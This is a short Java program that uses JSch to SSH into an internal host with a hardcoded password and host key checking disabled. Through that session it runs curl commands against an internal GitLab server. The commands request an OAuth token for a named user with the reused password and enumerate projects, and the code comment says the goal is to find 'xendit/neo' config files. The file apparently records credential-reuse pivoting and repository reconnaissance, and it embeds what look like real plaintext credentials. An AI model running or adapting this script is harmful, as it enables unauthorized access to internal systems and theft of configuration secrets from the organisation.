import com.jcraft.jsch.*;
import java.io.*;
class SSZ9 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // Try GitLab API - list projects, search for xendit/neo config files
    ch.setCommand("echo ---GITLAB-LOGIN---;curl -sk -X POST 'https://gitlab1.internaltools.biz/oauth/token' -d 'grant_type=password&username=herman&password=kutul0nc4t' 2>/dev/null | head -5;echo ---GITLAB-SEARCH---;curl -sk 'https://gitlab1.internaltools.biz/api/v4/projects?search=neo&per_page=20' 2>/dev/null | head -10;echo ---GITLAB-SEARCH2---;curl -sk 'https://gitlab1.internaltools.biz/api/v4/projects?search=noxify&per_page=20' 2>/dev/null | head -10;echo ---GITLAB-PUBLIC---;curl -sk 'https://gitlab1.internaltools.biz/api/v4/projects?visibility=public&per_page=50' 2>/dev/null | python3 -c 'import sys,json;[print(p[\"path_with_namespace\"]) for p in json.load(sys.stdin)]' 2>&1 | head -20");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
